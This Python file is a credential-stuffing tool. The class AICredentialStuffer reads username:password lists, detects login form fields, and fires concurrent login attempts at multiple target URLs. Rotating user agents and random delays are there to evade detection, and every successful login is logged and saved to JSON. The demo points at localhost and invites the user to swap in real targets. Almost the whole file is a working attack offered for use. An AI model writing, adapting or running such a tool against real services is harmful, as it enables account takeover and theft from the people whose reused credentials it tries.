import requests
import json
import time
import random
from concurrent.futures import ThreadPoolExecutor
import pandas as pd

class AICredentialStuffer:
    def __init__(self, target_urls, credential_file):
        self.target_urls = target_urls
        self.credential_file = credential_file
        self.successful_logins = []
        self.session_pool = [requests.Session() for _ in range(10)]
        
    def load_credentials(self):
        credentials = []
        try:
            with open(self.credential_file, 'r') as f:
                for line in f:
                    if ':' in line:
                        username, password = line.strip().split(':', 1)
                        credentials.append((username, password))
        except FileNotFoundError:
            print(f"Credential file {self.credential_file} not found")
            return []
        return credentials
    
    def analyze_target(self, url):
        """Analyze target to determine login parameters"""
        try:
            session = random.choice(self.session_pool)
            response = session.get(url, timeout=10)
            
            # Simple form field detection
            login_fields = {
                'username_field': 'username',
                'password_field': 'password',
                'csrf_token': None
            }
            
            # Look for common field names
            content = response.text.lower()
            if 'name="email"' in content:
                login_fields['username_field'] = 'email'
            elif 'name="user"' in content:
                login_fields['username_field'] = 'user'
            
            return login_fields
            
        except Exception as e:
            print(f"Error analyzing target {url}: {e}")
            return None
    
    def attempt_login(self, url, username, password, login_fields):
        """Attempt login with adaptive techniques"""
        session = random.choice(self.session_pool)
        
        # Randomize user agent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        data = {
            login_fields['username_field']: username,
            login_fields['password_field']: password
        }
        
        try:
            response = session.post(url, data=data, headers=headers, timeout=10)
            
            # Success detection logic
            success_indicators = [
                'dashboard', 'welcome', 'profile', 'logout', 'settings',
                response.status_code in [200, 302]
            ]
            
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error', 'wrong'
            ]
            
            response_text = response.text.lower()
            
            # Check for success
            if any(indicator in response_text for indicator in success_indicators):
                if not any(indicator in response_text for indicator in failure_indicators):
                    return True, response.status_code, response.url
            
            return False, response.status_code, response.url
            
        except Exception as e:
            return False, 0, str(e)
    
    def stuff_credentials(self, max_workers=5):
        """Execute credential stuffing attack"""
        credentials = self.load_credentials()
        if not credentials:
            print("No credentials loaded")
            return
        
        print(f"Starting credential stuffing with {len(credentials)} credentials")
        print(f"Targeting {len(self.target_urls)} URLs")
        
        results = []
        
        for url in self.target_urls:
            print(f"\nTesting against: {url}")
            login_fields = self.analyze_target(url)
            
            if not login_fields:
                continue
            
            successful_count = 0
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                
                for username, password in credentials[:20]:  # Limit for demo
                    future = executor.submit(
                        self.attempt_login, url, username, password, login_fields
                    )
                    futures.append((future, username, password, url))
                
                for future, username, password, target_url in futures:
                    try:
                        success, status_code, final_url = future.result(timeout=30)
                        
                        result = {
                            'url': target_url,
                            'username': username,
                            'password': password,
                            'success': success,
                            'status_code': status_code,
                            'final_url': final_url
                        }
                        
                        results.append(result)
                        
                        if success:
                            successful_count += 1
                            print(f"SUCCESS: {username}:{password} on {target_url}")
                            self.successful_logins.append(result)
                        else:
                            print(f"Failed: {username}:{password} on {target_url} ({status_code})")
                        
                        # Adaptive delay
                        time.sleep(random.uniform(0.5, 2.0))
                        
                    except Exception as e:
                        print(f"Error testing {username}:{password}: {e}")
            
            print(f"Completed testing {url}: {successful_count} successful logins")
        
        return results
    
    def save_results(self, results, filename='stuffing_results.json'):
        """Save results to file"""
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"Results saved to {filename}")

# Demo function
def demo_credential_stuffing():
    # Demo targets (replace with actual targets for real testing)
    target_urls = [
        "http://localhost:8080/login",
        "http://localhost:3000/auth/login"
    ]
    
    stuffer = AICredentialStuffer(target_urls, 'credentials.txt')
    print("Demo mode - replace target URLs with actual targets")
    print("This would test credential stuffing against multiple targets")
    
    # Show what would be tested
    credentials = stuffer.load_credentials()
    print(f"Loaded {len(credentials)} credential pairs")
    for i, (user, pwd) in enumerate(credentials[:5]):
        print(f"  {i+1}. {user}:{pwd}")

if __name__ == "__main__":
    demo_credential_stuffing()
